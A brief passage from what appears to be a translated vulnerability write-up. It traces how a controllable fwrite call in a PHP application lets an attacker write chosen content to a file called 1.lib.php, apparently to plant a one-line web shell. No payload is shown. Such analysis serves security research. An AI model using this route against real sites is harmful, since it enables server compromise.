In the code, we can see the fwrite write function, where the first variable fp specifies a file as a variable called truefile, where truefile is controllable

At this point, the general idea is clear. Use the fwrite function to write to the file. The written file is

1.lib.php, which is convenient for us to write a sentence, and then write the content to the content variable. This

variable is controllable by us, so start trying to write
